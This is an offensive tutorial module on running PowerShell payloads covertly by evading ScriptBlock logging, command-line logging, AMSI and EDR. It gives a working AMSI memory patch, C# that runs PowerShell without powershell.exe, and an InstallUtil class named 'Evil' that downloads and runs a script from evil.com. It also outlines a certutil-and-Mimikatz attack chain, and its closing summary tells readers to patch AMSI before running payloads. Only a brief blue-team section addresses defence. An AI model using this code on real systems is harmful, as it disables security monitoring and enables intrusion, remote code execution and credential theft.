Overview
PowerShell is an incredibly powerful tool for post-exploitation—but it's also heavily monitored by AV/EDR solutions through logging mechanisms like:

ScriptBlock Logging
Module Logging
Command Line Logging (Event ID 4688)
AMSI (Antimalware Scan Interface)
This module will cover how to bypass those detections and run PowerShell payloads covertly using both native obfuscation and real-world examples.

1. Why PowerShell is Tracked
Method	Monitored Through
powershell.exe -enc ...	Command-line arguments
IEX (Invoke-Expression)	ScriptBlock logging
DownloadFile / WebClient	AMSI
Therefore, executing PowerShell directly must involve obfuscation, in-memory techniques, and AMSI bypass.

2. Evasion via Obfuscation
Classic Base64 Obfuscation
Example:

powershell.exe -EncodedCommand aQBlAHgAIABbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCdYWFhYWFg...'))
Limitations:

Easily decoded
Triggers static YARA rules
Detectable by AMSI
3. Bypassing AMSI
AMSI Patch in PowerShell
This is a known method to bypass AMSI by modifying memory of amsi.dll in PowerShell’s process.

$win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
  [DllImport("kernel32")]
  public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
  [DllImport("kernel32")]
  public static extern IntPtr LoadLibrary(string name);
  [DllImport("kernel32")]
  public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $win32
$ptr = [Win32]::GetProcAddress([Win32]::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
[UInt32]$old = 0
[Win32]::VirtualProtect($ptr, [UIntPtr]5, 0x40, [Ref]$old)
$bytes = [Byte[]] (0xB8,0x57,0x00,0x07,0x80)  # mov eax,0x80070057 (E_ACCESSDENIED)
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, 5)
Result: AMSI is neutered. All future PowerShell commands will not be scanned.

4. In-Memory Execution Without powershell.exe
C# Reflective Execution of PowerShell Commands
using System;
using System.Management.Automation;
using System.Collections.ObjectModel;

class Program {
    static void Main(string[] args) {
        PowerShell ps = PowerShell.Create();
        ps.AddScript("whoami; Get-Process | Out-File C:\\Temp\\procs.txt");
        ps.Invoke();
    }
}
Compile with:

csc /r:System.Management.Automation.dll ps_injector.cs
This avoids powershell.exe entirely, using the .NET System.Management.Automation assembly directly.

5. Alternative: Living off the Land with InstallUtil.exe
You can create a .NET executable that contains your PowerShell payload and execute it via InstallUtil.exe (a known LOLBIN) without detection.

using System;
using System.Management.Automation;
using System.Configuration.Install;

[System.ComponentModel.RunInstaller(true)]
public class Evil : System.Configuration.Install.Installer {
    public override void Uninstall(System.Collections.IDictionary savedState) {
        PowerShell ps = PowerShell.Create();
        ps.AddScript("Invoke-WebRequest -Uri http://evil.com/shell.ps1 -OutFile C:\\Temp\\evil.ps1; powershell -ExecutionPolicy Bypass -File C:\\Temp\\evil.ps1");
        ps.Invoke();
    }
}
Compile and run:

csc /target:library /r:System.Management.Automation.dll evil.cs
InstallUtil.exe /U evil.dll
6. Real-World Attack Chain
A Red Team engagement simulated:

Dropping a .ps1 via LOLBAS (certutil)
Patching AMSI
Running obfuscated Invoke-Mimikatz from memory
Using System.Net.WebClient inside .NET to avoid powershell.exe
7. Recommendations for Blue Teams
Monitor for .NET reflection using System.Management.Automation
Set Group Policies to enforce Constrained Language Mode
Enable AMSI + ScriptBlock logging
Alert on excessive Base64 on command lines
Summary
Avoid command-line PowerShell
Patch AMSI memory before running payloads
Use reflection or .NET assemblies to execute PowerShell code in memory
Combine LOLBINs like InstallUtil.exe or rundll32.exe for stealth
